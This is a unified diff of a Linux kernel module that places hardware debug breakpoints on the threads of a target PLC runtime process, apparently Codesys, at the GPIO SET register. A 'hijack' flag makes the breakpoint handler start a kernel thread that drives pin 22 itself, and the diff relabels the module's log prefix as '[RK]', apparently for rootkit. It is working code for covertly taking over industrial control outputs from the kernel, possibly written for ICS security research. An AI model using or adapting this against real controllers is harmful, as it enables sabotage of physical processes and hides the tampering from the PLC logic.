@@ -45,6 +45,8 @@ int blink_func(void* data) {
 	int g = 22; // Pin 22 attached to LED
 	int i, repeat;
 
+	printk(KERN_INFO "[RK] Hijacking...\n");
+
 	repeat = 4000 / interval; // Codesys logic switches the led every 4 seconds
 	for (i = 0; i < repeat; i++) {
 		msleep(interval);
@@ -55,8 +57,9 @@ int blink_func(void* data) {
 		GPIO_SET = 1 << g; // Switch on the LED
 	}
 	
-	while (!kthread_should_stop()) msleep(50);
+	printk(KERN_INFO "[RK] Done!\n");
 
+	while (!kthread_should_stop()) msleep(50);
 	return 0;
 }
 
@@ -65,13 +68,11 @@ static void dr_excp_handler(struct perf_event *bp,
                                struct pt_regs *regs) {
 
 	if (hijack == 1) {
-
 		// Async call to the blink function
 		task = kthread_run(&blink_func, NULL, "blink");
 		if (IS_ERR((void*)task)) {
 			printk(KERN_INFO "[DR_Handler] Creating thread... failed %ld\n", PTR_ERR((void*)task));
 		}
-
 	}
 
 }
@@ -79,34 +80,33 @@ static void dr_excp_handler(struct perf_event *bp,
 
 static int __init hw_break_module_init(void) {
         int ret;
-	long l;					// Casted char pointer received from module_param
-	char *endptr;				// End of casted char pointer
-        struct task_struct *tsk;		// Process tsk struct
-        struct task_struct *tTsk;		// Each thread tsk struct
+	long l;
+	char *endptr;
+	struct task_struct *tsk, *tTsk;
         struct perf_event_attr attr;
 
-        printk(KERN_INFO "[DR] init\n");
+        printk(KERN_INFO "[RK] init\n");
 
 	l = simple_strtol(gpioB, &endptr, 0);
         if (endptr == NULL) {
-                printk(KERN_INFO "[DR] Failed to cast input address!!");
+                printk(KERN_INFO "[RK] Failed to cast input address\n");
 		return 0;
         }
 
 	gpio = (unsigned *)l; // GPIO base
         set_p = (l+(long)0x1C); // Offset of SET register
 
-	printk(KERN_INFO "[DR] Target process: %d\n", ppid);
-        printk(KERN_INFO "[DR] GPIO Base address: %x %s %lu\n", (unsigned)gpio, gpioB, l);
-	printk(KERN_INFO "[DR] GPIO SET Register: 0x%lx\n", set_p);
-	printk(KERN_INFO "[DR] Interval: %d\n", interval);
-	printk(KERN_INFO "[DR] Hijack: %d\n", hijack);
+	printk(KERN_INFO "[RK] Target process: %d\n", ppid);
+        printk(KERN_INFO "[RK] GPIO Base address: %x %s %lu\n", (unsigned)gpio, gpioB, l);
+	printk(KERN_INFO "[RK] GPIO SET Register: 0x%lx\n", set_p);
+	printk(KERN_INFO "[RK] Interval: %d\n", interval);
+	printk(KERN_INFO "[RK] Hijack: %d\n", hijack);
 
         tsk = pid_task(find_vpid(ppid), PIDTYPE_PID);
 
 	tTsk = tsk;
         if (tsk) {
-                printk(KERN_INFO "[DR] Userland process struct_tsk PID: %d\n", ppid);
+                printk(KERN_INFO "[RK] Userland process struct_tsk PID: %d\n", ppid);
 		do {
 		        hw_breakpoint_init(&attr);
 			attr.bp_addr = set_p;
@@ -115,24 +115,22 @@ static int __init hw_break_module_init(void) {
 
 		        drpcpu = register_user_hw_breakpoint(&attr, dr_excp_handler, NULL, tTsk);
 			pThread[tCount] = drpcpu;
-		        if (IS_ERR((void __force *)drpcpu)) {
-		                ret = PTR_ERR((void __force *)drpcpu);
-		                goto fail;
+		        if (IS_ERR((void*)drpcpu)) {
+		                ret = PTR_ERR((void*)drpcpu);
+				printk(KERN_INFO "[RK] Setting debug registers... failed %d\n", ret);
+				return ret;
 		        }
 
-		        printk(KERN_INFO "[DR_Thread] Setting DR registers... done\n");
+		        printk(KERN_INFO "[RK] Setting debug registers... done\n");
 			tCount += 1;
 		} while_each_thread(tsk, tTsk);
-		printk(KERN_INFO "Thread count: %d\n", tCount);
+		printk(KERN_INFO "[RK] Thread count: %d\n", tCount);
         } else {
-                printk(KERN_INFO "[DR_ERR]* Error pid_task failed!\n");
-                return 0;
+		ret = PTR_ERR((void*)tsk);
+                printk(KERN_INFO "[RK] Error pid_task failed %d\n", ret);
+                return ret;
         }
 	return 0;
-
-fail:
-        printk(KERN_INFO "[DR_Thread] Setting DR registers... failed %d\n", ret);
-        return ret;
 }
 
 static void __exit hw_break_module_exit(void) {
@@ -142,7 +140,7 @@ static void __exit hw_break_module_exit(void) {
                 unregister_hw_breakpoint(pThread[i]);
         }
 	kthread_stop(task);
-        printk(KERN_INFO "[DR] exit\n");
+        printk(KERN_INFO "[RK] exit\n");
 
 }
 
